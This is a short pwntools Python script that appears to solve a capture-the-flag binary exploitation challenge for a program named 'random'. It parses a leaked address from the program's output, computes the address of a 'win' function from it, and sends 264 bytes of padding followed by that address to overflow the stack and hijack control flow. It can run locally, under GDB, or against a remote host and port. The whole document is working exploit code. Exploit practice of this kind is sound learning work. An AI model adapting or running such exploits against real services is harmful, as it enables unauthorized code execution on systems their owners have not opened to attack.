from pwn import *

elf = context.binary = ELF("random")
payload = b'A' * 264

gs = '''
   b *win
   continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.REMOTE:
        return remote(*(sys.argv[1].split(":")))
    else:
        return process(elf.path)

p = start()

context.terminal = ['tmux', 'splitw', '-h']  # Vertical split (side-by-side)
p.recvuntil(b"secret ") 

leak = p.recvline().strip()
leak = "0x" + leak.decode()
leak = int(leak, 16)

print(hex(leak))

win = leak  - 0x104

payload += p64(win)

p.sendlineafter(b":", payload)
p.interactive()
